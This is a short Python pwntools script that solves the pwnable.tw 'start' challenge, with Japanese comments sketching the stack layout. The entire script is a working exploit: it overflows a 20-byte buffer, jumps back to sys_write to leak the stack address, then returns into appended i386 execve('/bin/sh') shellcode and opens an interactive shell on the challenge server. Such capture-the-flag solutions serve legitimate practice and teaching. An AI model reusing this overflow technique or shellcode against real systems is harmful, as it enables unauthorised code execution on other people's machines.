from pwn import *

shellcode = b"\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

context(arch='i386', os='linux')
context.log_level = 'debug'

print('remote / local: ', end='')
env = input()
if env == 'r\n':
    proc = remote('chall.pwnable.tw', 10000)
else:
    proc = process('./start')
    gdb.attach(proc)

proc.recvuntil(':')

# jump sys_write for leak esp address
proc.send(b'a'*20+p32(0x08048087))
esp = proc.recv(20)[:4]

# jump shellcode
proc.send(b'a'*20+p32(unpack(esp)+20)+shellcode)

proc.interactive()

# スタックのメモ

# sys_write前
# --------------------------------
# esp
# 0x804809d (_exit)
# 20 (Let's start the CTF:)

# 1週目のret時
# --------------------------------
# esp
# 0x08048087 (sys_write)
# --------------------------------

# 1週目のret後
# --------------------------------
# esp
# --------------------------------

# 2週目のsys_write
# --------------------------------
# esp
# --------------------------------

# 2週目のsys_read
# --------------------------------
# esp
# shellcode
# (shellcode addr)
# 'a'*20
# --------------------------------
